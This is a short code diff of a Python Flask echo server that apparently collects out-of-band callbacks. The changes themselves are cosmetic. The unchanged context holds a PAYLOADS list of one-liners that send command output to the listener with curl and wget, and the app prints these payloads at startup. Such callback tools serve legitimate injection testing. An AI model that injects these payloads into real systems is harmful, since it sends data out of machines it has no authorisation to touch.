@@ -18,7 +18,6 @@ def handle_record(record: EchoRecord):
 
 
 # SOME
-
 PAYLOADS = [
     f"pwd | curl --data-binary @- http://{HOST}:{PORT}/",
     f'wget --method=POST --body-data="$(pwd)" http://{HOST}:{PORT}/ -O -',
@@ -137,8 +136,6 @@ TEMPLATE = """
 </body>
 </html>
 """
-
-
 # SOME end
 
 
@@ -189,8 +186,6 @@ def save_record(record: EchoRecord):
         DB.commit()
 
 
-# EchoRecord end
-
 # flask
 app = Flask(__name__)
 
@@ -223,8 +218,8 @@ def echo_path(data):
 
 # run app
 if __name__ == "__main__":
-    init()
     # init tables for db
+    init()
 
     for payload in PAYLOADS:
         print(f"\n-\t{payload}")
